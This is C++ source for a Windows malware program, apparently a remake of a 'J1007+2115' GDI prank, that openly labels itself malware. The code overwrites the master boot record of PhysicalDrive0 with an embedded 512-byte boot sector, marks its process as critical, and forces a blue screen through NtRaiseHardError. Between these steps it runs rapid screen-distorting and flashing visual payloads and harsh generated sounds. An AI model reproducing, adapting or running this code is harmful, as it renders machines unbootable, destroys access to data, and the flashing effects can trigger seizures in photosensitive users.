// J1007+2115.cpp : remake of J100758.264+211529.207.exe
//

#include <windows.h>
//#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
//#pragma comment(lib,"Msimg32.lib")
#include <math.h>
//#include <time.h>
//#include "bootrec.h"
//#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xEA, 0x07, 0x7C, 0x00, 0x00, 0xF8, 0xFC, 0x0E, 0x17, 0x0E, 0x1F, 0x31, 0xC0, 0x31,
0xDB, 0xB9, 0xFF, 0x00, 0xBE, 0x07, 0x7C, 0xBC, 0xFE, 0xFF, 0x89, 0xE7, 0x40, 0xCD, 0x10, 0xB8,
0x00, 0xB8, 0x8E, 0xC0, 0x91, 0xB4, 0x2E, 0xF3, 0xAB, 0x56, 0xBE, 0x5C, 0x7D, 0xBA, 0x05, 0x01,
0xE8, 0x32, 0x01, 0x91, 0xCD, 0x1A, 0x52, 0xBD, 0x30, 0x30, 0xBA, 0x11, 0x1C, 0xBB, 0x00, 0x1C,
0x59, 0x5E, 0xAD, 0x01, 0xC8, 0x7A, 0x02, 0xB7, 0x28, 0x56, 0x50, 0x31, 0xC9, 0xE8, 0x2F, 0x01,
0xE8, 0xA5, 0x00, 0x42, 0x42, 0xE8, 0x86, 0x00, 0x4A, 0x4A, 0xE8, 0x81, 0x00, 0x87, 0xDA, 0xB1,
0x04, 0xE8, 0x7F, 0x00, 0xE8, 0x27, 0x01, 0x87, 0xDA, 0xF4, 0x38, 0xF7, 0x75, 0x2E, 0x52, 0x28,
0xDA, 0xF6, 0xDA, 0x78, 0xFC, 0x80, 0xFA, 0x03, 0x5A, 0x7F, 0x21, 0xBE, 0x07, 0x7C, 0x81, 0xC5,
0x00, 0x01, 0xB1, 0x26, 0x51, 0xB1, 0x04, 0xE8, 0x59, 0x00, 0xE8, 0x01, 0x01, 0x83, 0xEE, 0x25,
0x59, 0xE2, 0xF1, 0x81, 0xFD, 0x00, 0x3A, 0x7C, 0xA1, 0xF9, 0xEB, 0x18, 0xEB, 0x2F, 0x80, 0xF6,
0x34, 0x80, 0xFB, 0x20, 0x75, 0xAA, 0x4A, 0x80, 0xFA, 0x07, 0x7F, 0x91, 0x45, 0x95, 0x3C, 0x3A,
0x95, 0x7C, 0x87, 0xF8, 0xBE, 0x62, 0x7D, 0xBA, 0x05, 0x03, 0x72, 0x02, 0xB2, 0x1E, 0x31, 0xDB,
0xF9, 0xE8, 0xA1, 0x00, 0x31, 0xC0, 0xCD, 0x16, 0xEA, 0x07, 0x7C, 0x00, 0x00, 0x43, 0xB4, 0x01,
0xCD, 0x16, 0x74, 0xCD, 0x30, 0xE4, 0xCD, 0x16, 0x3C, 0x1B, 0x74, 0xEC, 0xEB, 0xC0, 0xBE, 0x20,
0x7D, 0xB1, 0x02, 0x88, 0xF0, 0x98, 0x97, 0xB0, 0x50, 0xF6, 0xEA, 0x01, 0xC7, 0xA5, 0xA5, 0xA5,
0xA5, 0xA5, 0x83, 0xC7, 0x46, 0xE2, 0xF6, 0xC3, 0xB1, 0x1A, 0x89, 0xCF, 0xB8, 0xDF, 0x74, 0xF6,
0xC3, 0x01, 0x75, 0x02, 0xB0, 0xDC, 0xAB, 0x51, 0xF9, 0xB4, 0x00, 0xB1, 0x05, 0xF3, 0xAB, 0x73,
0x06, 0xB4, 0x0F, 0xAB, 0xF5, 0xEB, 0xF2, 0xB4, 0x74, 0xAB, 0x83, 0xC7, 0x36, 0x59, 0xE2, 0xE6,
0xC3, 0x00, 0xDE, 0x04, 0x7C, 0x4E, 0xDD, 0x04, 0x20, 0x07, 0xB2, 0x08, 0xC1, 0x0C, 0x1E, 0x4B,
0xC1, 0x0C, 0xB2, 0x08, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x00,
0x20, 0x00, 0x5C, 0x07, 0xDC, 0x07, 0x2F, 0x07, 0xFB, 0x07, 0xDB, 0x07, 0x7E, 0x70, 0x22, 0x74,
0x40, 0x07, 0x20, 0x07, 0xB3, 0x70, 0x20, 0x08, 0xB3, 0x70, 0x20, 0x08, 0x53, 0x53, 0x41, 0x55,
0x4F, 0x59, 0x4E, 0x4F, 0x57, 0xB4, 0x02, 0xCD, 0x10, 0xB1, 0x03, 0xAC, 0xB4, 0x0A, 0xCD, 0x10,
0xE2, 0xF9, 0xB2, 0x1E, 0xF5, 0x72, 0xEE, 0xBA, 0x0F, 0x1A, 0xB4, 0x02, 0xCD, 0x10, 0xC3, 0x95,
0xBF, 0xFC, 0x00, 0x86, 0xE0, 0xAA, 0x83, 0xC7, 0x31, 0x86, 0xC4, 0xAA, 0x95, 0xC3, 0x52, 0xB0,
0xB6, 0xE6, 0x43, 0x88, 0xD0, 0xE6, 0x42, 0xD0, 0xE8, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6,
0x61, 0xB6, 0x09, 0xE8, 0x15, 0x00, 0x29, 0xD0, 0x92, 0xE8, 0x0F, 0x00, 0x39, 0xD0, 0x7F, 0xF9,
0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xE8, 0x0F, 0x00, 0x5A, 0xC3, 0x31, 0xC0, 0xE6, 0x43, 0xE4,
0x40, 0x86, 0xE0, 0xE4, 0x40, 0x86, 0xE0, 0xC3, 0xBA, 0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x74, 0xFB,
0xEC, 0xA8, 0x08, 0x75, 0xFB, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
void mbr()
{
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	//CloseHandle(hDevice);
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
/*typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;*/ //didn't need it this time
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
DWORD WINAPI shader1(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * cbrt(y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
		hdc = GetDC(0);
		HBRUSH brush = CreateHatchBrush(rand() % 7, RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Ellipse(hdc, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        Rectangle(hdc, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
        Sleep(20);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
    }
}
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI payload3(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int rx;
    for (int i = 0;; i++) {
		hdc = GetDC(0);
        rx = rand() % sw;
        int ry = rand() % sh;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, rx, 10, 100, sh, hdc, rx, 0, 0x1900ac010e);
        BitBlt(hdc, rx, -10, -100, sh, hdc, rx, 0, 0x1900ac010e);
        BitBlt(hdc, 10, ry, sw, 96, hdc, 0, ry, 0x1900ac010e);
        BitBlt(hdc, -10, ry, sw, -96, hdc, 0, ry, 0x1900ac010e);
        Sleep(1);
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI wef(LPVOID lpParam) {
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(25);
        }
    }
}
DWORD WINAPI textout(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"J1007+2115.exe";
    while (1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(10);
		ReleaseDC(0, hdc);
    }
}
DWORD WINAPI payload6(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
        Sleep(10);
		ReleaseDC(0, hdc);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 9 | t >> 13));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t << 1) ^ ((t << 1) + (t >> 7) & t >> 12)) | t >> (4 - (1 ^ 7 & (t >> 19))) | t >> 7;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t >> (t / 512));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t << t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
) 
{
    if (MessageBoxW(NULL, L"This is a Malware, Run?", L"J1007+2115.exe by pankoza", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record and it contains flashing lights - Not for epilepsy!", L"J1007+2115.exe - Final Warning", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
			ProcessIsCritical();
			mbr();
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, wef, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, payload3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(2000);
            HANDLE thread5 = CreateThread(0, 0, textout, 0, 0, 0);
            HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
            HANDLE thread7 = CreateThread(0, 0, wef, 0, 0, 0);
            sound4();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC0000069, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
